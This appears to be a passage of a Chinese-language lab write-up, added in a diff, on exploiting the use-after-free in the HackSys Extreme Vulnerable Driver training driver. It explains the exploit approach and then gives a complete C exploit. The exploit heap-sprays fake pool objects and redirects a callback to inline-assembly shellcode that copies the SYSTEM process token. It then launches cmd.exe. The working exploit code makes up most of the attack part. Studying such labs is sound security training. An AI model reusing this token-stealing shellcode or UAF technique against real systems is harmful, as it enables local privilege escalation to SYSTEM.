+        DbgPrint("[+] Fake Object: 0x%p\n", KernelFakeObject);
+    }
+    __except (EXCEPTION_EXECUTE_HANDLER)
+    {
+        Status = GetExceptionCode();
+        DbgPrint("[-] Exception Code: 0x%X\n", Status);
+    }
+
+    return Status;
+}
+```
+
+## 利用思路
+
+首先分配一块内存到池中，包含函数指针和回调函数部分，然后释放掉这块空间，然而没有置为NULL。此时存在一个hangling指针，如果采用堆喷的手法保证能够覆盖释放掉的池内存，同时将前8个字节修改为指向shellcode的地址，最后调用use方法，执行函数指针即可！
+
+## 编写exp
+
+>`CreateFileA`用来创建或打开一个文件或IO设备，包括：文件、文件系统、目录、物理盘、volume、console buffer、tape drive、communication resource、masilslot和管道等。该函数返回一个句柄，根据文件或设备以及指定的标志和属性，该句柄可用于访问各种类型I/O的文件或设备。
+>
+>```c
+>HANDLE CreateFileA(
+>  LPCSTR                lpFileName,				// 文件或设备名
+>  DWORD                 dwDesiredAccess,		// 请求的访问权限
+>  DWORD                 dwShareMode,			// 请求的共享模式
+>  LPSECURITY_ATTRIBUTES lpSecurityAttributes,	// 安全属性
+>  DWORD                 dwCreationDisposition,	// 对存在或不存在的文件或设备执行的操作
+>  DWORD                 dwFlagsAndAttributes,	// flag和属性
+>  HANDLE                hTemplateFile			// 临时文件的句柄
+>);
+>```
+>
+
+打开IO设备后，调用`DeviceIoControl`即可控制驱动。
+
+完整exp如下：
+
+```c
+#include<stdio.h>
+#include<windows.h>
+
+#define IOCTL(Function) CTL_CODE(FILE_DEVICE_UNKNOWN, Function, METHOD_NEITHER, FILE_ANY_ACCESS)
+
+#define HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL            IOCTL(0x804)
+#define HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL                 IOCTL(0x805)
+#define HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL                IOCTL(0x806)
+#define HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL           IOCTL(0x807)
+
+typedef void(*FunctionPointer)(void);
+
+typedef struct _USE_AFTER_FREE_NON_PAGED_POOL
+{
+	FunctionPointer Callback;
+	CHAR Buffer[0x54];
+} USE_AFTER_FREE_NON_PAGED_POOL, *PUSE_AFTER_FREE_NON_PAGED_POOL;
+
+void Shellcode()
+{
+	_asm
+	{
+		nop
+		pushad
+		mov eax, fs:[124h]		// 找到当前线程的_KTHREAD结构
+		mov eax, [eax + 0x50] 	// 找到_PROCESS&_EPROCESS结构
+		mov ecx, eax 			// ecx为当前线程
+		mov edx, 4
+
+		// 循环获取system的_EPROCESS
+		find_sys_pid :
+					 mov eax, [eax + 0xb8]		// 找到ActiveProcessLinks
+					 sub eax, 0xb8			// FLINK
+					 cmp[eax + 0xb4], edx	// 与uid = 4比较
+					 jnz find_sys_pid
+
+					 // 替换Token
+					 mov edx, [eax + 0xf8]
+					 mov[ecx + 0xf8], edx
+					 popad
+					 ret
+	}
+}
+static VOID CreateCmd()
+{
+	STARTUPINFO si = { sizeof(si) };
+	PROCESS_INFORMATION pi = { 0 };
+	si.dwFlags = STARTF_USESHOWWINDOW;
+	si.wShowWindow = SW_SHOW;
+	WCHAR wzFilePath[MAX_PATH] = { L"cmd.exe" };
+	BOOL bReturn = CreateProcessW(NULL, wzFilePath, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, (LPSTARTUPINFOW)&si, &pi);
+	if (bReturn) CloseHandle(pi.hThread), CloseHandle(pi.hProcess);
+}
+
+int main() {
+	HANDLE hDevice = INVALID_HANDLE_VALUE;  // handle to the drive to be examined
+	hDevice = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
+		GENERIC_READ | GENERIC_WRITE,
+		NULL,
+		NULL,
+		OPEN_EXISTING,
+		NULL,
+		NULL);
+
+	if (hDevice == INVALID_HANDLE_VALUE) {
+		printf("cannot open i/o device");
+		return false;  
+	}
+	DWORD recvBuf;
+
+	// allocate memory in non_paged pool
+	DeviceIoControl(hDevice,                       // device to be queried
+		HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL, // operation to perform
+		NULL, 0,                       // no input buffer
+		NULL, 0,
+		&recvBuf,                         // # bytes returned
+		NULL);          // synchronous I/O
+
+	// free it
+	DeviceIoControl(hDevice,                       // device to be queried
+		HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL, // operation to perform
+		NULL, 0,                       // no input buffer
+		NULL, 0,
+		&recvBuf,                         // # bytes returned
+		NULL);          // synchronous I/O
+
+	printf("make a fake object in pool");
+
+	PUSE_AFTER_FREE_NON_PAGED_POOL faked = (PUSE_AFTER_FREE_NON_PAGED_POOL)malloc(sizeof(USE_AFTER_FREE_NON_PAGED_POOL));
+
+	RtlFillMemory((PVOID)faked->Buffer, sizeof(faked->Buffer), 0x41);
+	faked->Buffer[sizeof(faked->Buffer) - 1] = '\0';
+
+	faked->Callback = &Shellcode;
+
+	printf("heap spary!!!");
+	for (int i = 0; i < 5000; ++i) {
+		// free it
+		DeviceIoControl(hDevice,                       // device to be queried
+			HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL, // operation to perform
+			faked, 0x60,                       // no input buffer
+			NULL, 0,
+			&recvBuf,                         // # bytes returned
+			NULL);           // synchronous I/O
+	}
+
+	// free it
+	DeviceIoControl(hDevice,                       // device to be queried
+		HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL, // operation to perform
+		NULL, 0,                       // no input buffer
+		NULL, 0,
+		&recvBuf,                         // # bytes returned
+		NULL);          // synchronous I/O
+
+	CreateCmd();
+
+	return 0;
+}
+
+```
 
 
 
